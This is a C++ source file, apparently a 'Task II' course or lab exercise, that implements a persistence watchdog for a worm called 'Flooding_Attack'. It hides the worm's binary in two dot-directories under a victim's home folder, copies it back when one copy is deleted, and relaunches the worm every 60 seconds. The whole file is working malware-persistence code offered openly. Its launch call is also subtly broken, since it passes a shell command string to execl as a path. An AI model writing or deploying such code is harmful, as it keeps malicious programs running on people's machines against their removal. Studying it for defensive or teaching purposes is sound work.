/**
 * Task II
 *
 * This program should be executed whenever the computer is booted. It checks
 * whether the worm is running or not for every 60 seconds. This program itself
 * does not perform any payload.
 *
 * The first worm should be put at var LOCATION_A while another tentative put at
 * var LOCATION_B
 */

#include <stdlib.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <unistd.h>
#include <fstream>
#include <iostream>
#include <string>

#define MINUTE 60 * 1000 * 1000
#define LOCATION_A "/home/victim/.etc/.module/Flooding_Attack"
#define LOCATION_B "/home/victim/.firefox/.module/Flooding_Attack"

std::string dirnameOf(const std::string& fname) {
    size_t pos = fname.find_last_of("\\/");
    return (std::string::npos == pos) ? "" : fname.substr(0, pos);
}

bool hasFileAt(const char* path) {
    struct stat buffer;
    return stat(path, &buffer) == 0;
}

// Copy a file from srcpath to dstpath.
bool copyFile(const char* srcpath, const char* dstpath) {
    system(("mkdir -p " + dirnameOf(dstpath)).c_str());
    std::ifstream src(srcpath, std::ios::binary);
    std::ofstream dst(dstpath, std::ios::binary);
    dst << src.rdbuf();
}

// Gaurentees that worm bin files are put at two locations.
bool requireTwoWormDistributed() {
    std::cout << "Checking the worm binary files ..." << std::endl;
    bool a = hasFileAt(LOCATION_A), b = hasFileAt(LOCATION_B);
    if (a) std::cout << "Worm exists at \"" << LOCATION_A << "\"." << std::endl;
    if (b) std::cout << "Worm exists at \"" << LOCATION_B << "\"." << std::endl;
    if (a && b) return true;
    if (a && !b) {
        std::cout << "Copy worm from \"" << LOCATION_A << "\" to \""
                  << LOCATION_B << "\"" << std::endl;
        copyFile(LOCATION_A, LOCATION_B);
        return true;
    }
    if (b && !a) {
        std::cout << "Copy worm from \"" << LOCATION_B << "\" to \""
                  << LOCATION_A << "\"" << std::endl;
        copyFile(LOCATION_B, LOCATION_A);
        return true;
    }
    std::cout << "Worm files had been deleted at both places." << std::endl;
    return false;
}

// Queires if the program is running by given PID.
bool isWormRunning(pid_t pid) {
    int status;
    return waitpid(pid, &status, WNOHANG) == 0;
}

// Queries any location the worm binary is repalced. If no bin file exists,
// return empty string.
std::string isWormDistributed() {
    if (hasFileAt(LOCATION_A)) return LOCATION_A;
    if (hasFileAt(LOCATION_B)) return LOCATION_B;
    return "";
}

// Executes the worm placed at given location. Returns the PID of the executed
// worm.
pid_t runWorm(std::string& loc) {
    std::cout << "Try to execute the worm at \"" << loc << "\"" << std::endl;
    pid_t pid = fork();
    std::cout << "chmod +x '" + loc + "' && '" + loc + "'" << std::endl;
    if (pid == 0) {
        // Children
        execl(("chmod +x '" + loc + "' && '" + loc + "'").c_str(),
              "Flood Attack", NULL);
        exit(0);
    }
    return pid;
}

int main() {
    std::cout << "Timer starts." << std::endl;
    pid_t pid = -1;
    while (1) {
        requireTwoWormDistributed();
        std::cout << "Checking the worm with PID " << pid << " ......"
                  << std::endl;
        if (pid < 0 || !isWormRunning(pid)) {
            std::cout << "Worm not running. Trying to execute the worm ......"
                      << std::endl;
            std::string path = isWormDistributed();
            if (path == "") {
                std::cout << "Worm bin files had been deleted. Failed to "
                             "execute the worm."
                          << std::endl;
                break;
            }
            pid = runWorm(path);
            if (pid < 0) {
                std::cout << "For some reason failed to execute the worm."
                          << std::endl;
                break;
            }
            std::cout << "Worm executed. PID is " << pid << " ." << std::endl;
        } else {
            std::cout << "The worm is still running." << std::endl;
        }
        usleep(MINUTE);
    }
    std::cout << "Timer terminated." << std::endl;
    return -1;  // should not end
}